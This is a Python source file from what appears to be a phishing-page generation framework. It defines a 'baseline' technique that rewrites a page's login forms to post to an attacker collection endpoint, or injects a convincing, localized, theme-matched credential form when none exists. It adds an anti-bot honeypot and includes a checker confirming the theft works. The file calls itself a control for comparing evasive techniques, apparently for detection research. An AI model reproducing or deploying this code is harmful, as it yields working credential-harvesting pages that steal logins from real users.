from __future__ import annotations

import urllib.parse
from typing import Any, ClassVar

from bs4 import BeautifulSoup

from app.techniques.base import (
    ApplyResult, BaseTechnique, Category, OptionSpec, Requirement, TechniqueGroup,
)
import re

from app.utils.html_utils import parse_html, serialize_html


class BaselinePhishingTechnique(BaseTechnique):
    """
    T25 — Regular phishing (baseline credential-stealing form).

    Ensures the page has a working credential-stealing form pointing to
    the configured collection endpoint. If no form exists, a clean
    login form is injected. Used as the benchmark / control variant.
    """

    TECHNIQUE_ID: ClassVar[int] = 25
    TECHNIQUE_NAME: ClassVar[str] = "Baseline Regular Phishing Form"
    GROUP: ClassVar[TechniqueGroup] = TechniqueGroup.ADVANCED_AI
    CATEGORIES: ClassVar[list[Category]] = [Category.CREDENTIAL_THEFT, Category.PERSONAL_INFO_HARVESTING]
    REQUIREMENTS: ClassVar[list[Requirement]] = [Requirement.HAS_HTML]
    DESCRIPTION: ClassVar[str] = (
        "Ensures a credential-stealing form exists on the page. "
        "Redirects all form actions to the collection endpoint. "
        "Used as the baseline / control for comparing evasive techniques."
    )
    OPTION_SPECS: ClassVar[list[OptionSpec]] = [
        OptionSpec(
            name="form_action_url",
            description="URL where credentials POST to (attacker server)",
            type=str,
            default="/collect",
        ),
        OptionSpec(
            name="credential_field_names",
            description="Names for username and password fields",
            type=list,
            default=["username", "password"],
        ),
        OptionSpec(
            name="inject_honeypot",
            description="Add an invisible honeypot field to detect anti-bot filling",
            type=bool,
            default=True,
        ),
    ]

    _SPA_SELECTORS: ClassVar[tuple[str, ...]] = (
        "#root", "#app", "#__next", "[data-reactroot]",
    )

    @staticmethod
    def _sniff_theme_color(soup) -> str | None:
        meta = soup.find("meta", attrs={"name": "theme-color"})
        if meta and meta.get("content"):
            color = meta["content"].strip()
            if color:
                return color
        rx = re.compile(r"background(?:-color)?\s*:\s*(#[0-9a-fA-F]{3,8}|rgb[a]?\([^)]+\))")
        for tag in soup.find_all(style=True):
            for m in rx.finditer(tag["style"]):
                c = m.group(1)
                lo = c.lower()
                if lo in ("#fff", "#ffffff", "#000", "#000000", "#fafafa", "#f5f5f5"):
                    continue
                return c
        return None

    def _find_spa_root(self, soup):
        for sel in self._SPA_SELECTORS:
            try:
                hit = soup.select_one(sel)
                if hit is not None:
                    return hit, sel
            except Exception:
                continue
        return None, None

    def apply(
        self,
        html: str,
        url: str,
        options: dict[str, Any],
        screenshot_bytes: bytes | None = None,
    ) -> ApplyResult:
        form_action: str = options.get("form_action_url", "/collect")
        field_names: list[str] = options.get(
            "credential_field_names", ["username", "password"]
        )
        inject_honeypot: bool = bool(options.get("inject_honeypot", True))

        parsed = urllib.parse.urlparse(url)
        domain = parsed.netloc or "example.com"
        lang = self._detect_lang(html, url)

        soup = parse_html(html)
        forms = soup.find_all("form")
        login_forms = [f for f in forms if f.find("input", attrs={"type": "password"})]
        changes = []

        theme_color = self._sniff_theme_color(soup) or "#1a73e8"
        spa_root, spa_sel = self._find_spa_root(soup)
        honeypot_name = "__hp_field_" + (field_names[0] if field_names else "x")

        if login_forms:
            for form in login_forms:
                old_action = form.get("action", "")
                form["action"] = form_action
                form["method"] = "POST"
                if inject_honeypot:
                    honeypot = soup.new_tag(
                        "input",
                        type="text",
                        attrs={
                            "name": honeypot_name,
                            "style": "display:none;",
                            "tabindex": "-1",
                            "autocomplete": "off",
                            "aria-hidden": "true",
                        },
                    )
                    form.append(honeypot)
                    guard = soup.new_tag("script")
                    guard.string = (
                        "(function(f,h){if(!f||!h)return;"
                        "f.addEventListener('submit',function(ev){"
                        "var v=f.querySelector('[name=\"'+h+'\"]');"
                        "if(v && v.value){ev.preventDefault();ev.stopPropagation();}"
                        "},true);})(document.currentScript&&document.currentScript.previousElementSibling,"
                        f"'{honeypot_name}');"
                    )
                    form.append(guard)
                changes.append(self._make_change(
                    "form_action_redirected",
                    f"Form action changed → {form_action}",
                    before=old_action or "(no action)",
                    after=form_action,
                    details={
                        "form_action_url": form_action,
                        "theme_color": theme_color,
                        "honeypot_field": honeypot_name if inject_honeypot else None,
                        "spa_root": spa_sel,
                    },
                ))
        else:
            username_field = field_names[0] if field_names else "username"
            password_field = field_names[1] if len(field_names) > 1 else "password"
            honeypot_field = (
                f'<input type="text" name="{honeypot_name}" '
                'style="display:none;" tabindex="-1" autocomplete="off" aria-hidden="true">'
                if inject_honeypot
                else ""
            )
            guard_js = (
                f"""<script>(function(){{
var f=document.querySelector('#__phish_form_wrapper__ form');
if(!f) return;
f.addEventListener('submit',function(ev){{
  var v=f.querySelector('[name=\"{honeypot_name}\"]');
  if(v && v.value){{ev.preventDefault();ev.stopPropagation();}}
}},true);
}})();</script>"""
                if inject_honeypot else ""
            )

            from app.utils.i18n import t as _t
            dir_attr = "rtl" if lang == "fa" else "ltr"
            form_html = f"""
<div id="__phish_form_wrapper__" dir="{dir_attr}" style="max-width:360px;margin:40px auto;
     font-family:Tahoma,Arial,sans-serif;padding:32px;border:1px solid #e0e0e0;
     border-radius:8px;background:#fff;">
  <h2 style="margin-bottom:24px;font-size:20px;color:#202124;">{_t("form.button.signin_to", lang, domain=domain)}</h2>
  <form action="{form_action}" method="POST">
    <label style="display:block;margin-bottom:4px;font-size:14px;color:#5f6368;">
      {_t("form.label.username_or_email", lang)}
    </label>
    <input type="text" name="{username_field}" required
           style="width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;
                  margin-bottom:16px;font-size:16px;">
    <label style="display:block;margin-bottom:4px;font-size:14px;color:#5f6368;">
      {_t("form.label.password", lang)}
    </label>
    <input type="password" name="{password_field}" required
           style="width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;
                  margin-bottom:24px;font-size:16px;">
    {honeypot_field}
    <button type="submit"
            style="width:100%;background:{theme_color};color:#fff;border:none;
                   border-radius:4px;padding:12px;font-size:16px;cursor:pointer;">
      {_t("form.button.signin", lang)}
    </button>
  </form>
</div>{guard_js}"""

            body = soup.find("body")
            if not body:
                body = soup.new_tag("body")
                html_tag = soup.find("html")
                if html_tag:
                    html_tag.append(body)
                else:
                    soup.append(body)

            host = spa_root if spa_root is not None else body
            frag = BeautifulSoup(form_html, "lxml")
            for child in list((frag.body or frag).children):
                if getattr(child, "name", None):
                    host.append(child)

            changes.append(self._make_change(
                "baseline_form_injected",
                f"Injected baseline credential form → {form_action}; "
                f"fields={field_names}; honeypot={inject_honeypot}; theme={theme_color}",
                details={
                    "form_action_url": form_action,
                    "theme_color": theme_color,
                    "spa_root": spa_sel,
                    "honeypot_field": honeypot_name if inject_honeypot else None,
                    "field_names": field_names,
                    "lang": lang,
                },
            ))

        self.log("info", "baseline_applied",
                 forms_existing=len(forms), login_forms=len(login_forms),
                 theme=theme_color, spa=spa_sel or "none",
                 honeypot=honeypot_name if inject_honeypot else "off")

        return ApplyResult(
            modified_html=serialize_html(soup),
            modified_url=None,
            extra_files={},
            change_log=changes,
        )

    def evaluate(self, html, url, change_log, extra_files):
        from app.techniques.base import EvaluationResult
        import re
        signals, issues = [], []

        has_form = html and "<form" in html.lower()
        if has_form:
            signals.append("HTML has <form> element")
        else:
            issues.append("HTML missing <form> element")

        has_password = html and 'type="password"' in html.lower()
        if has_password:
            signals.append("HTML has password <input>")
        else:
            issues.append("HTML missing password <input>")

        form_actions = re.findall(r'<form\b[^>]*?\s+action="([^"]*)"', html or "", re.IGNORECASE)
        collect_action = any("/collect" in a or a.endswith("/collect") for a in form_actions)
        if collect_action:
            signals.append(f"Form action points to /collect endpoint")
        elif form_actions:
            issues.append(f"Form action(s) {form_actions[:2]} do NOT point to /collect")
        else:
            issues.append("No <form> with action attribute found")

        entry = next(
            (e for e in change_log if e.change_type in ("form_action_redirected", "baseline_form_injected")), None
        )
        if entry:
            action = entry.details.get("form_action_url", "")
            signals.append(f"change_log: form action → {action!r}")
        else:
            issues.append("No form_action_redirected or baseline_form_injected in change_log")

        passed = bool(has_form and has_password and collect_action)
        return EvaluationResult(
            passed=passed,
            score=self._eval_score(signals, issues),
            signals=signals,
            issues=issues,
            details={"has_form": has_form, "has_password": has_password, "collect_action": collect_action},
        )
